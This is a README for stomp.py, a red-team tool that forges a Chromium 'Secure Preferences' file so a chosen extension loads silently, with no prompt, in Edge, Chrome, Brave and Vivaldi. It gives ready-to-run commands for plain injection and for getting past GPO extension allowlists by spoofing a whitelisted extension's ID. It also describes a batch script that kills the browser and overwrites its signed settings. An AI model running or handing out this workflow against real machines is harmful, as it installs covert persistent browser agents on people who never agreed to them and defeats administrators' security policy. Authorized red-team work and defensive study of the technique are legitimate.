# stomp.py

> Inject browser extensions into Chromium-based browsers without the store - with GPO bypass support.

A red team tool for persistent browser-based agent deployment.

---

## How It Works

Chromium browsers store their configuration, including installed extensions, in a `Secure Preferences` file signed with an HMAC. `stomp.py` generates a valid replacement file that registers an arbitrary extension, with a correctly computed HMAC derived from the target user's SID.

On next browser launch, the extension is loaded silently, no store, no warning dialog, no user interaction required.

---

## Tested Browsers

| Browser | Status |
|---------|--------|
| Microsoft Edge | ✅ Confirmed |
| Google Chrome | ✅ Confirmed |
| Brave | ✅ Confirmed |
| Vivaldi | ✅ Confirmed |
| Opera | ⚠️ Partial (HMAC may differ) |

---

## Requirements

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

- Python 3.8+
- Target's current `Secure Preferences` file
- Target user's SID (`whoami /user`)

---

## Usage

### Basic injection

```bash
python3 stomp.py EXTENSION_FOLDER/ \
  --prefs-file SecurePreferences \
  --sid "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local"
  --browser edge
```

### GPO allowlist bypass (`--spoof`)

If the target environment restricts extensions to a GPO whitelist, use `--spoof` to derive the public key of a whitelisted extension from the store — giving your extension the same ID:

```bash
python3 stomp.py EXTENSION_FOLDER/ \
  --spoof <whitelisted_extension_id> \
  --prefs-file SecurePreferences \
  --sid "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local"
```

Whitelisted IDs are visible at `edge://policy` or `chrome://policy`.

### GPO bypass with corporate proxy (`--proxy`)

If you are behind a corporate proxy and cannot access the extension store directly, use `--proxy` to route the CRX download through your proxy:

```bash
python3 stomp.py EXTENSION_FOLDER/ \
  --spoof <whitelisted_extension_id> \
  --proxy http://proxy.corp.com:8080 \
  --prefs-file SecurePreferences \
  --sid "S-1-5-21-XXX-XXX-XXX-XXX" \
  --target-dir "C:\\Users\\<user>\\AppData\\Local"
```

The `--proxy` parameter accepts standard HTTP/HTTPS proxy URLs:
- Basic: `http://proxy.corp.com:8080`
- With authentication: `http://username:password@proxy.corp.com:8080`

**Note:** If you receive a DNS resolution error (`[Errno 11001] getaddrinfo failed`) when running `--spoof`, it likely means your machine is behind a proxy. Check your proxy settings with:
```bash
netsh winhttp show proxy
```

### Options

| Option | Description |
|--------|-------------|
| `--prefs-file` | Path to the target's current `Secure Preferences` |
| `--sid` | Target user's SID (`whoami /user`) |
| `--target-dir` | Directory where the extension folder will be placed |
| `--spoof <ID>` | Spoof a whitelisted extension ID from the store |
| `--proxy <URL>` | HTTP/HTTPS proxy URL for downloading CRX (e.g. `http://proxy.corp.com:8080`) |
| `--browser` | Specified a browser (edge, chrome, brave, vivaldi), default=edge |

---

## Output

stomp generates a deployment-ready ZIP archive:

```
output.zip
├── extension/              # Extension folder, ready to copy
├── info.json               # Extension metadata and deployment info
├── inject.bat              # Automated deployment script
├── Secure Preferences      # Generated Secure Preferences (Edge, Chrome, Brave)
└── SecurePreferencesClean  # Backup of the original Secure Preferences
```

Transfer the ZIP to the target machine and execute `inject.bat`.
The script handles the full deployment sequence:

1. Kill any running browser instance
2. Restore clean `Secure Preferences` to avoid state collisions
3. Open and close the browser to reset internal state
4. Copy the extension folder to `%LOCALAPPDATA%`
5. Overwrite `Secure Preferences` with the generated file

---

## Extension Structure

Your extension must be a valid Chromium MV3 extension.
Minimum required structure:

```
EXTENSION_FOLDER/
├── manifest.json
├── background.js
└── content.js
```

For GPO bypass, `stomp` automatically injects the correct `key` field in `manifest.json` when using `--spoof`.

---

## Limitations

- **Initial access required** - stomp must be executed in the context of the target user
- **Extension folder visible on disk** - baseline injection leaves an artifact in `%LOCALAPPDATA%`
- **SID required** - needed to compute a valid HMAC
- **Proxy support** - Only HTTP/HTTPS proxies are supported; SOCKS proxies are not supported by `urllib.request`

---

## Disclaimer

This tool is intended for authorized red team operations, security research, and educational purposes only.
Use responsibly and only on systems you have explicit permission to test.

---

## Credits

This work builds on the original [extloader](https://www.synacktiv.com/publications/lextension-fantome-infiltrer-chrome-par-des-voies-inexplorees) research by [Synacktiv](https://www.synacktiv.com).

## Author

**Corentin Mahieu** / [Fir3n0x](https://github.com/Fir3n0x)  
[fir3n0x.github.io](https://fir3n0x.github.io) · [LinkedIn](https://www.linkedin.com/in/corentin-mahieu/)
